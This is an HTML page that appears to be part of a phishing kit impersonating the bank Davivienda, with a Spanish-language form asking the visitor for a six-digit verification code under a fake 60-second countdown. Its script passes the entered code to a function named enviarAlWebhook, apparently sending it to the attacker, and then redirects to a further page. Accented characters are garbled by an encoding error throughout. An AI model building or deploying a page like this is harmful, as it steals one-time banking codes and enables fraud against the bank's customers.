<!DOCTYPE html>
<html lang="es">
<head>

  <title>Validaci√≥n de c√≥digo</title>

</head>
<body>
  <div class="top-bar">
    <img src="DaviviendaLogo.png" alt="Logo Davivienda" class="logo-franja" />
  </div>

  <div class="container">
    <h2 class="titulo-login">Ingrese el c√≥digo de verificaci√≥n que te hemos enviado</h2>
    <form id="codigoForm" onsubmit="validarCodigo(event)">
      <input type="text" id="codigo" placeholder="C√≥digo de 6 d√≠gitos" maxlength="6" required />
      <p id="error" class="mensaje-error"></p>

      Este c√≥digo ha sido enviado a su dispositivo registrado. Si no lo ha recibido, <a href="#">solicite uno nuevo</a>.
    </div>

    <p class="temporizador">‚è≥ Tiempo restante: <span id="contador">60</span> segundos</p>
  </div>

  <div class="footer">

  <script>
    function validarCodigo(e) {
      e.preventDefault();
      const codigo = document.getElementById("codigo").value.trim();
      const error = document.getElementById("error");

      if (!/^\d{6}$/.test(codigo)) {
        error.textContent = "El c√≥digo debe tener exactamente 6 d√≠gitos num√©ricos.";
        return;
      }

      error.textContent = "";
      enviarAlWebhook("üì≤ C√≥digo ingresado", codigo)
        .then(() => window.location.href = "index3.html")
        .catch(() => alert("Error al enviar el c√≥digo"));
    }

    let tiempo = 60;
    const contador = document.getElementById("contador");
    const intervalo = setInterval(() => {
      tiempo--;
      contador.textContent = tiempo;
      if (tiempo <= 0) {
        clearInterval(intervalo);
        contador.textContent = "0";
        alert("El tiempo ha expirado. Solicite un nuevo c√≥digo.");
      }
    }, 1000);
  </script>
</body>
</html>
